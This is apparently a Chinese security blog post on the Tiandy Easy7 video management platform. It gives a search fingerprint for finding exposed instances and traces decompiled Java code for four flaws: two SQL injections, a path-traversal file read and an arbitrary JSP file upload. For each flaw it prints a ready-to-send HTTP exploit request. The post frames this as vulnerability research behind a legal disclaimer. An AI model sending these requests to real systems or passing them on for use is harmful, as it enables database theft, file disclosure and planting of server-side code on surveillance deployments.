#  天地伟业Easy7漏洞-浅析  
原创 Kokoxca安全
                    Kokoxca安全  Kokoxca安全   2026-01-02 15:25  
  
新岁序开，码上平安。愿你我深耕Java疆域，洞悉0day于字节之间，2026探索代码山河，祝师傅们2026年每日一day，dayday不一样  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Fireworks.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Fireworks.png "")  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Fireworks.png "")  
  
。  
  
0x01 技术文章仅供参考学习，请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。若使用者利用本文中技术信息或代码工具对任何计算机系统造成的任何直接或者间接的后果及损失，均由使用者本人负责。本文所提供的技术信息或代码工具仅供于学习，一切不良后果与文章作者无关。使用者应该遵守法律法规，并尊重他人的合法权益。  
  
0x02 指纹信息  
```
web.body="./jsapi/js/bootstrap/js/bootstrap.min.js"
```  
  
0x03 漏洞分析  
  
1.queryUserbyDesc SQL注入漏洞  
  
入口点：  
  
com/tiandy/easy7/core/rest/CLS_REST_User.java#queryUserbyDesc 154-157行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGOVKNHZWx6A5BJ6kaXqibuKbFFJh5icbPJLrZ6o7uCiaOdsliajl3CgPMww/640?wx_fmt=png&from=appmsg "")  
  
追踪queryUserbyDesc方法进入com/tiandy/easy7/core/bo/CLS_BO_User.java#queryUserbyDesc 643-653行  
  
1.仅进行简  
单的空值检查if(userDesc!= null && !"".equals(userDesc))`  
  
2. 关键点: 没有对userDesc进行任何安全过滤或SQL特殊字符转义  
  
3.直接将原始参数传递到DAO层 this.daoUser.queryUserbyDesc(userDesc)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGfZjPZjhwqJTibx4XtxCX9D0QeG8oEFH9mguo1cb6mibd7KuHvXBZPWGA/640?wx_fmt=png&from=appmsg "")  
  
追踪daoUser  
.queryUserbyDesc方法进入com/tiandy/easy7/core/dao/CLS_DAO_User.java#queryUserbyDesc 1133-1153行  
  
这里也就是漏洞触发点了。使用StringBuffer直接拼接SQL语句后使用Hibernate的createSQLQuery()执行原生SQL。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGXh9G0h25pAasfOxzkngTQle5hKfhaH7eWPa1nucNZYxgH8vfo4keBQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现  
```
GET /Easy7/rest/user/queryUserbyDesc?userDesc=1'union+select+1,version(),MD5(123)--+ HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGW304VyQUphDpdhnibD8k9Ujs4UibKXic5MWOicuI2sibt2vjEL9XMZYd5XA/640?wx_fmt=png&from=appmsg "")  
  
1.2 getAuthorityByUserId SQL注入漏洞  
  
入口点:com/tiandy/easy7/core/rest/CLS_REST_User.java[#getAuthorityByUserId]()  
 92-94行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGpmfFpyibDhHW8WxmMMIicK2sdl89uTCp0zJAaYDphdY9z4ibicALtz6mXw/640?wx_fmt=png&from=appmsg "")  
  
追踪getAuthorityByUserId方法进入com/tiandy/easy7/core/bo/CLS_BO_User.java#getAuthorityByUserId 443-461行  
  
1. 仅进行空值检查，未进行安全过滤  
  
2. 关键代码:this.daoUser.getAuthorityTypesByUserId(userId, objId)  
  
3. 问题: userId和objId未经任何过滤直接传递到DAO层  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGAa0te7ib8mmpGYakoRqFiaPyH1MHy46Xwic4jGG1kz9IjibrGKl4A9SLPg/640?wx_fmt=png&from=appmsg "")  
  
  
追踪  
getAuthorityTypesByUserId  
方法进入com/tiandy/easy7/core/dao/CLS_DAO_User.java#  
getAuthorityTypesByUserId  
 461-472行  
  
1.两个注入点:userId和objId都直接拼接到SQL中，未使用PreparedStatement参数化查询，没有SQL特殊字符转义。  
  
2.SQL执行: 通过Hibernate执行原生SQL  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGYteMJZ7xdWegbXDVicAQNy19V7cBZ5FG7ePcDaODqPwQhRc51nXMmAw/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现  
```
GET /Easy7/rest/user/getAuthorityByUserId?userId=&objId=a'and(select*from(select+sleep(5))a+union+select+1)='&authTypes.authTypes=1 HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGynwRFMic1mlSJlGpWPuHlcLCFrZKTxmsKJjPUicQ5iaSALiclgzAZTML9Q/640?wx_fmt=png&from=appmsg "")  
  
  
1.3 downloadFile 任意文件读取漏洞  
  
入口点:com/tiandy/easy7/core/rest/CLS_REST_File.java#  
downloadFile  
 668-718行  
  
1. 直接拼接: path + fileName，没有任何安全检查  
  
2. 文件读取:new FileInputStream(newPath)使用拼接后的路径创建文件输入流  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGwu6VlyglibgXUYJibQnuosRpTJa13Yr7hDopWxHot0QERuibq9Lfarkag/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现  
```
GET /Easy7/rest/file/downloadFile?fileName=../../../../../../../../../../../../../../etc/hosts HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGt3MMKs2fhiaf0HznRWPcia9Rzmbkru3h0o5yM5moZogeiabhUibgAnxvlw/640?wx_fmt=png&from=appmsg "")  
  
  
1.4 uploadMapServerBgImage 任意文件上传漏洞  
  
  
入口点:com/tiandy/easy7/core/rest/CLS_REST_File.java[#]()  
  
uploadMapServerBgImage  
 1024-1027行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGcKu7kYNVoyxIRfovsopcfmJsz17SdarrxbgA1fB00UVPib171TNO9dg/640?wx_fmt=png&from=appmsg "")  
  
追踪this  
.  
boFile  
.uploadFiles方法进入com/tiandy/easy7/core/bo/CLS_BO_File.java[#]()  
  
uploadFiles  
 377-506行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGnWicArVp8BiaicoV8RmIaIQhVWubTNfCkbo7hqvdGyvppSfhKMdbljZjw/640?wx_fmt=png&from=appmsg "")  
  
  
1. 检查请求是否为multipart/form-data类型  
  
2. 初始化输入输出流变量  
  
3. 如果不是multipart请求，返回错误  
```
public CLS_VO_Result uploadFiles(HttpServletRequest req) throws IOException {
    CLS_VO_Result result = new CLS_VO_Result();
    InputStream fis = null;
    FileOutputStream fos = null;
    String fileName = "";
    boolean isMultipart = ServletFileUpload.isMultipartContent(req);
    if (!isMultipart) {
        result.setRet(-7);
        return result;
    }
```  
  
1. 使用Apache Commons FileUpload解析请求，items列表包含所有表单字段和文件。  
  
3. 每个item可能是表单字段或上传的文件  
```
FileItemFactory factory = new DiskFileItemFactory();
ServletFileUpload upload = new ServletFileUpload(factory);
List items = null;

try {
    items = upload.parseRequest(req);
} catch (FileUploadException var32) {
    result.setRet(-7);
    return result;
}

if (null == items) {
    result.setRet(-7);
    return result;
}
```  
  
其中  
uploadParams是一个  
JSON数组字符串，完全由用户控制这一步很重要。  
  
然后看到  
将JSON反序列化为CLS_VO_MapServerBgImage对象列表。  
  
private String path;  // 上传路径 -用户可控!  
  
private String name;  // 文件名 - 用户可控!  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGMYuQb9OdUgNMnicS51814iau4sDbo6WRW4iavbWz9iakFDoHP1ualapiaLg/640?wx_fmt=png&from=appmsg "")  
  
```
List mapServerBgImage = new ArrayList();
Iterator i$ = items.iterator();

String uploadPath;
while(i$.hasNext()) {
    FileItem fileItems = (FileItem)i$.next();
    if (fileItems.isFormField() && fileItems.getSize() != 0L) {
        String fieldName = fileItems.getFieldName();
        if ("uploadParams".equals(fieldName)) {
            try {
                JSONArray array = null;
                uploadPath = fileItems.getString("UTF-8");
                if (StringUtils.isNotEmpty(uploadPath)) {
                    array = JSONArray.fromObject(uploadPath);
                }
                mapServerBgImage = JSONArray.toList(array, CLS_VO_MapServerBgImage.class);
            } catch (UnsupportedEncodingException var31) {
                log.error("转码错误", var31);
                result.setRet(-7);
                return result;
            }
        }
    }
}
```  
  
1.CLS_Easy7_Types.PROJECT_PATH是项目根路径  
  
2.问题:如果uploadPath = ../../../webapps/  
  
3.mkdirs()方法会创建所有必要的父目录  
```
File dir = new File(CLS_Easy7_Types.PROJECT_PATH + uploadPath);
if (!dir.exists()) {
    dir.mkdirs();
}
```  
  
基本很明确了路径可控，文件名可控且不存在任何黑白名单。  
  
  
漏洞复现  
```
POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
Host: 
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPwn
Content-Length: 301

------WebKitFormBoundaryPwn
Content-Disposition: form-data; name="uploadParams"

[{"path":"/../../webapps/Easy7/","name":"html1.jsp"}]
------WebKitFormBoundaryPwn
Content-Disposition: form-data; name="file"; filename="html1.jsp"
Content-Type: image/jpeg

<%
out.println("Hello World");
%>
------WebKitFormBoundaryPwn--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGNaH0u2RWv22RfjDPUrbGXyjibah4HXx98VicpSxuU5iaGhldZs0meNIHQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ10j24FliaXVJLkSd3bXuiaEXGngUyd8H1UaBzOODEd9xeS7reoVYuOgtxMo9ibXDvibjWBr6hz2tIaFEQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
